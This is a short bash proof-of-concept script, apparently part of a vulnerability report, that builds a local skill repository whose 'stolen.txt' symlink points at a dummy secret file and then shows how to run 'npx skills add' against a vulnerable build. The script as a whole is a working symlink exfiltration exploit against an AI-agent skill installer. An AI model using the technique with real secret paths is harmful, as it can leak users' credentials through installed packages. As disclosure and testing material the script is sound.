#!/usr/bin/env bash
set -euo pipefail

WORKDIR="${1:-/tmp/skills-symlink-poc}"
REPO_DIR="$WORKDIR/poc-skills"
SECRET_FILE="$WORKDIR/poc-secret.txt"

mkdir -p "$REPO_DIR/poc-symlink"
cp "$(dirname "$0")/poc-repo/poc-symlink/SKILL.md" "$REPO_DIR/poc-symlink/SKILL.md"

echo 'super-secret-token' > "$SECRET_FILE"
ln -sf "$SECRET_FILE" "$REPO_DIR/poc-symlink/stolen.txt"

echo "[+] PoC repo prepared at: $REPO_DIR"
echo "[+] Secret file: $SECRET_FILE"
echo "[+] Symlink payload: $REPO_DIR/poc-symlink/stolen.txt -> $SECRET_FILE"
echo
echo "Run against a vulnerable build:"
echo "  npx skills add $REPO_DIR --skill \"poc-symlink\" -y"
echo "Then inspect installed directory for stolen.txt"
